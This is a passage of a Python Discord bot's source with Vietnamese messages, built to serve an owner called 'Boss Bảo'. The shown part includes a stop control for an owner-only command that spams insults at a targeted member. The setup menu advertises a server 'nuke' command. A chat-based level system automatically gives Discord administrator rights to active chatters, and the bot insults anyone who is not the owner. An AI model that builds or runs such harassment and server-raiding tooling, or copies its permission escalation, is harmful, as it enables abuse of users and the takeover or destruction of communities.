    await ctx.send(f"🚨 Bắt đầu spam {member.mention}")

@spam.error
async def spam_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stop")
@is_bot_owner()
async def stop_bot(ctx):
    global is_spamming, spam_task_running
    is_spamming = False
    if spam_task_running:
        spam_task_running.cancel()
        spam_task_running = None
    await ctx.send("🛑 Đã dừng spam.")

@stop_bot.error
async def stop_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="channelslog")
@is_bot_owner()
async def channelslog(ctx, channel: discord.TextChannel = None):
    if not channel:
        if ctx.guild.id in SERVER_LOG_CHANNELS: del SERVER_LOG_CHANNELS[ctx.guild.id]
        return await ctx.send("✅ Đã tắt log.")
    SERVER_LOG_CHANNELS[ctx.guild.id] = channel.id
    await ctx.send(f"✅ Đã đặt kênh log: {channel.mention}")

@channelslog.error
async def channelslog_error(ctx, error):
    if isinstance(error, commands.CheckFailure): await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

# ==================== HỆ THỐNG LEVEL VÀ ĐẶC QUYỀN (670 LEVEL) ====================
async def handle_level_system(message):
    if message.author.bot or not message.guild:
        return

    guild_id = message.guild.id
    user_id = message.author.id

    if guild_id not in USER_LEVELS:
        USER_LEVELS[guild_id] = {}
    if user_id not in USER_LEVELS[guild_id]:
        USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": 1}

    user_data = USER_LEVELS[guild_id][user_id]
    user_data["exp"] += random.randint(5, 15)  # Nhận ngẫu nhiên EXP mỗi tin nhắn

    # Công thức tính EXP cần thiết cho level tiếp theo: level * 100
    exp_needed = user_data["level"] * 100

    if user_data["exp"] >= exp_needed and user_data["level"] < 670:
        user_data["exp"] -= exp_needed
        user_data["level"] += 1
        new_level = user_data["level"]

        # 1. Tạo role Level tương ứng nếu chưa có
        role_name = f"Level {new_level}"
        role = discord.utils.get(message.guild.roles, name=role_name)
        if not role:
            try:
                role = await message.guild.create_role(name=role_name, hoist=True)
            except:
                pass

        if role:
            try:
                await message.author.add_roles(role)
            except:
                pass

        # 2. Thông báo lên kênh kèm ảnh GIF theo yêu cầu
        embed = discord.Embed(
            title="🎉 CHÚC MỪNG LÊN LEVEL! 🎉",
            description=f"🚀 {message.author.mention} đã xuất sắc thăng hạng lên **Level {new_level}**! 🔥",
            color=0x00FF00
        )
        embed.set_image(url=LEVEL_UP_GIF)
        embed.set_footer(text="Tiếp tục chat để chinh phục mốc tối đa Level 670!")
        
        try:
            await message.channel.send(embed=embed)
        except:
            pass

        # 3. Gán các đặc quyền tương ứng theo yêu cầu
        try:
            # Lv 20: Có quyền ping everyone và here (Cấp quyền channel hoặc role tuỳ chỉnh, ở đây cấp qua quyền quản trị cơ bản)
            if new_level >= 20:
                pass 
            # Lv 200: Quản lí welcome và goodbye (Cấp quyền quản lý kênh)
            if new_level >= 200:
                manage_channels_perm = discord.Permissions(manage_channels=True)
                await role.edit(permissions=manage_channels_perm)
            # Lv 300: Nhắn được hết tất cả các kênh
            if new_level >= 300:
                pass # Role mặc định đã nhắn được kênh công khai
            # Lv 400: Quản lí server
            if new_level >= 400:
                manage_guild_perm = discord.Permissions(manage_guild=True)
                await role.edit(permissions=manage_guild_perm)
            # Lv 500: Admin server
            if new_level >= 500:
                admin_perm = discord.Permissions(administrator=True)
                await role.edit(permissions=admin_perm)
            # Lv 670: Owner server (Quyền tối cao quản lý)
            if new_level >= 670:
                owner_perm = discord.Permissions(administrator=True)
                await role.edit(permissions=owner_perm, name="👑 Server Owner (Lv.670)")
        except Exception as e:
            print(f"Lỗi phân quyền đặc quyền level: {e}")

# ==================== SỰ KIỆN GỬI TIN NHẮN (TÍCH HỢP LEVEL & CHECK TAG OWNER) ====================
@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    # Chạy hệ thống cộng EXP tính Level
    await handle_level_system(message)

    await bot.process_commands(message)

    if message.mentions:
        for user in message.mentions:
            if user.id in BOT_OWNERS:
                await message.reply("oi tag gì thế thích Boss Bảo tui à s k ns?")
                break

# ==================== SỰ KIỆN CHÀO MỪNG & TẠM BIỆT (TÍCH HỢP KÊNH RIÊNG) ====================
@bot.event
async def on_member_join(member):
    if member.guild is None: return
    
    # Kiểm tra xem server đã cài kênh setwellcom chưa, nếu chưa dùng kênh mặc định
    target_channel_id = WELCOME_CHANNELS.get(member.guild.id)
    target_channel = member.guild.get_channel(target_channel_id) if target_channel_id else None
    
    if not target_channel:
        target_channel = member.guild.system_channel or discord.utils.get(member.guild.text_channels, name="general")
        if not target_channel and member.guild.text_channels:
            target_channel = member.guild.text_channels[0]

    if target_channel:
        rainbow_color = random.choice([0xFF0000, 0xFFA500, 0xFFFF00, 0x008000, 0x0000FF, 0x4B0082, 0xEE82EE])
        embed = discord.Embed(
            title="🌈 Chào mừng thành viên mới đến với Server! 🌈",
            description=(
                f"Xin chào chú báo nhỏ {member.mention}! Chúc bạn có những phút giây vui vẻ tại đây.\n\n"
                f"📌 **Giới thiệu chung:**\n"
                f"• Hãy ghé thăm các kênh trò chuyện và giải trí.\n"
                f"• Tuân thủ nghiêm ngặt luật chung của server để tránh bị phạt nhé!\n"
            ),
            color=rainbow_color
        )
        embed.set_image(url="https://i.pinimg.com/originals/54/19/c9/5419c9ce3ffade43b2837daa2c96b1d9.gif")
        embed.set_footer(text=f"Thành viên thứ {member.guild.member_count} của server!")
        await target_channel.send(embed=embed)

    log_embed = discord.Embed(title="👋 THÀNH VIÊN MỚI", description=f"{member.mention}", color=0x00FF00)
    if member.guild.id in SERVER_LOG_CHANNELS:
        log_ch = bot.get_channel(SERVER_LOG_CHANNELS[member.guild.id])
        if log_ch: await log_ch.send(embed=log_embed)

@bot.event
async def on_member_remove(member):
    if member.guild is None: return

    # Gửi thông báo tạm biệt vào kênh đã setup qua l!setgoodbye (hoặc gửi DM)
    goodbye_channel_id = GOODBYE_CHANNELS.get(member.guild.id)
    goodbye_channel = member.guild.get_channel(goodbye_channel_id) if goodbye_channel_id else None

    if goodbye_channel:
        gb_embed = discord.Embed(
            title="😢 Tạm biệt thành viên!",
            description=f"Thật nuối tiếc khi **{member.name}** đã rời khỏi server. Chúc bạn một ngày tốt lành và hẹn gặp lại! 👋",
            color=0xFFA500
        )
        gb_embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
        try:
            await goodbye_channel.send(embed=gb_embed)
        except:
            pass

    try:
        dm_embed = discord.Embed(
            title="😢 Tạm biệt bạn nhé!",
            description=(
                f"Thật nuối tiếc khi bạn đã rời khỏi server **{member.guild.name}**.\n"
                f"Chúc bạn luôn vui vẻ, may mắn và có những trải nghiệm thật tuyệt vời trên chặng đường sắp tới! 👋"
            ),
            color=0xFFA500
        )
        dm_embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
        await member.send(embed=dm_embed)
    except:
        pass

# ==================== LỆNH SETUP & THÔNG TIN ====================
@bot.command(name="setup")
@is_bot_owner()
async def setup(ctx):
    embed = discord.Embed(
        title="💖✨ HỆ THỐNG QUẢN TRỊ TỐI CAO CỦA BOSS BẢO ✨💖",
        description=(
            f"🌸 **Kênh kết nối:** {ctx.channel.mention}\n"
            "📋 **Danh sách lệnh điều hành:**\n\n"
            "🔹 `l!setup` - Hiển thị bảng điều khiển.\n"
            "🔹 `l!nuke` - Nuke máy chủ bảo mật.\n"
            "🔹 `l!setwellcom #kenh` - Cài đặt kênh chào mừng.\n"
            "🔹 `l!setgoodbye #kenh` - Cài đặt kênh tạm biệt.\n"
            "🔹 `l!spam` - Spam chửi mục tiêu.\n"
            "🔹 `l!stop` - Dừng spam.\n"
            "🔹 Các lệnh quản trị khác..."
        ),
        color=0xFF69B4
    )
    embed.set_image(url=CUSTOM_SETUP_GIF)
    embed.set_footer(text="Độc quyền phục vụ Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@setup.error
async def setup_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(' NGU À? CÓ PHẢI BOSS BẢO KHÔNG MÀ SÀI? 🤣🤣🤣😂😂😒')

@bot.command(name="stats")
async def stats(ctx):
    guild = ctx.guild
    embed = discord.Embed(
        title=f"📊 🌈 **THÔNG SỐ MÁY CHỦ** 🌈",
        description=f"🏰 **Tên máy chủ:** `{guild.name}`\n👑 **Bảo trợ:** Boss Bảo",
        color=0xFF69B4
    )
    await ctx.send(embed=embed)

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 🌈 **CẨM NANG ĐIỀU HÀNH CỦA BOSS BẢO** 🌈",
        description="Hệ thống quản trị độc quyền phục vụ tối cao cho **Boss Bảo**.",
        color=0xFF69B4
    )
    await ctx.send(embed=embed)

# ==================== SỰ KIỆN ON_READY ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã sẵn sàng phục vụ Boss Bảo cùng hệ thống Level & Wellcom mới!")

if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
